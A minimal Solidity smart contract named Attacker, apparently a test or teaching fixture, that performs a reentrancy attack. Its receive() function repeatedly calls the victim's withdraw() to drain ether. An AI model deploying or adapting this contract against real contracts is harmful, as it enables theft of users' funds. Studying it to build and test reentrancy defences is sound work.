// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

interface IVictim {
	function deposit() external payable;

	function withdraw(uint256 value) external;
}

contract Attacker {
	address public victim;

	event Attacked();

	constructor(address _victim) {
		victim = _victim;
	}

	receive() external payable {
		// reentrant logic
		if (victim.balance >= 1 ether) {
			IVictim(victim).withdraw(1 ether);
			emit Attacked();
		}
	}

	function attack() external payable {
		IVictim(victim).deposit{ value: msg.value }();
		IVictim(victim).withdraw(msg.value);
	}
}
